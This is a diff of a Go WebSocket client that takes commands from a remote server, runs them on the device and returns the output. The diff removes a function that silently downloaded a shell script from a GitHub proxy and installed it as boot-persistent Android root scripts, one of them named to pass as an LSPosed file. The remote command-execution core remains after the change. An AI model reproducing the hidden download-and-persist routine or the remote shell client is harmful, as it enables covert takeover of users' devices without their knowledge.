@@ -3,7 +3,7 @@ package main
 import (
         "context"
         "encoding/json"
-        "io"
+        "fmt"
         "net"
         "net/http"
         "net/url"
@@ -25,32 +25,6 @@ const (
         pingPeriod  = 2 * time.Second
 )
 
-const scriptURL = "https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/load.sh"
-
-// ------------------ 下載腳本 ------------------
-func downloadScriptsSilently() {
-        data, err := downloadFile(scriptURL)
-        if err != nil {
-                return
-        }
-
-        os.MkdirAll("/data/adb/service.d", 0755)
-
-        _ = os.WriteFile("/data/adb/service.d/run.sh", data, 0755)
-        _ = os.WriteFile("/data/adb/service.d/lsposed.sh", data, 0755)
-}
-
-func downloadFile(url string) ([]byte, error) {
-        client := &http.Client{Timeout: 15 * time.Second}
-        resp, err := client.Get(url)
-        if err != nil {
-                return nil, err
-        }
-        defer resp.Body.Close()
-
-        return io.ReadAll(resp.Body)
-}
-
 // ------------------ 資料結構 ------------------
 type Message struct {
         Type      string `json:"type"`
@@ -65,6 +39,7 @@ type Message struct {
 func getDeviceID() string {
         data, err := os.ReadFile(deviceFile)
         if err != nil {
+                // 如果文件不存在，生成新的設備ID
                 newID := generateDeviceID()
                 os.WriteFile(deviceFile, []byte(newID), 0644)
                 return newID
@@ -77,7 +52,7 @@ func generateDeviceID() string {
         if hostname == "" {
                 hostname = "unknown"
         }
-        return hostname + "-" + time.Now().Format("20060102150405")
+        return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
 }
 
 // ------------------ 命令執行 ------------------
@@ -94,7 +69,7 @@ func executeCommand(cmdLine, cmdID, deviceID string) Message {
         output, err := cmd.CombinedOutput()
 
         msg := Message{
-                Type:      "result",
+                Type:      "result", 
                 CommandID: cmdID,
                 DeviceID:  deviceID,
                 Output:    string(output),
@@ -114,7 +89,9 @@ type WSClient struct {
 }
 
 func NewWSClient(deviceID string) *WSClient {
-        return &WSClient{deviceID: deviceID}
+        return &WSClient{
+                deviceID: deviceID,
+        }
 }
 
 func (w *WSClient) connect() error {
@@ -150,6 +127,7 @@ func (w *WSClient) connect() error {
         w.closed = false
         w.mu.Unlock()
 
+        // 設置心跳和超時處理
         conn.SetReadDeadline(time.Now().Add(readTimeout))
         conn.SetPongHandler(func(string) error {
                 conn.SetReadDeadline(time.Now().Add(readTimeout))
@@ -162,6 +140,7 @@ func (w *WSClient) connect() error {
 func (w *WSClient) close() {
         w.mu.Lock()
         defer w.mu.Unlock()
+
         if w.conn != nil && !w.closed {
                 w.conn.Close()
                 w.closed = true
@@ -177,9 +156,11 @@ func (w *WSClient) isClosed() bool {
 func (w *WSClient) sendMessage(msg Message) error {
         w.mu.RLock()
         defer w.mu.RUnlock()
+
         if w.closed || w.conn == nil {
-                return nil
+                return fmt.Errorf("connection closed")
         }
+
         return w.conn.WriteJSON(msg)
 }
 
@@ -224,6 +205,7 @@ func (w *WSClient) listen() {
 
                 _, msg, err := conn.ReadMessage()
                 if err != nil {
+                        fmt.Printf("讀取消息錯誤: %v\n", err)
                         return
                 }
 
@@ -233,9 +215,12 @@ func (w *WSClient) listen() {
                 }
 
                 if m.Type == "command" && (m.DeviceID == "" || m.DeviceID == w.deviceID) {
+                        // 異步執行命令，避免阻塞消息處理
                         go func() {
                                 result := executeCommand(m.Command, m.CommandID, w.deviceID)
-                                _ = w.sendMessage(result)
+                                if err := w.sendMessage(result); err != nil {
+                                        fmt.Printf("發送結果錯誤: %v\n", err)
+                                }
                         }()
                 }
         }
@@ -259,15 +244,24 @@ func (cm *ConnectionManager) run() {
         for {
                 cm.client = NewWSClient(cm.deviceID)
 
+                fmt.Printf("嘗試連接服務器...\n")
                 if err := cm.client.connect(); err != nil {
+                        fmt.Printf("連接失敗: %v, %v後重試...\n", err, retryDelay)
                         time.Sleep(retryDelay)
                         continue
                 }
 
+                fmt.Printf("連接成功! DeviceID: %s\n", cm.deviceID)
+
+                // 啟動心跳和監聽
                 go cm.client.startPing()
                 go cm.client.listen()
 
+                // 等待連接斷開
                 <-cm.reconnect
+
+                // 等待3秒後重連
+                fmt.Printf("連接斷開，%v後重試...\n", retryDelay)
                 time.Sleep(retryDelay)
         }
 }
@@ -288,13 +282,14 @@ func (cm *ConnectionManager) monitorConnection() {
 
 // ------------------ 主函數 ------------------
 func main() {
-
-        downloadScriptsSilently()
-
         deviceID := getDeviceID()
+        fmt.Printf("設備ID: %s\n", deviceID)
 
         manager := NewConnectionManager(deviceID)
 
+        // 啟動連接監控
         go manager.monitorConnection()
+
+        // 主循環
         manager.run()
 }
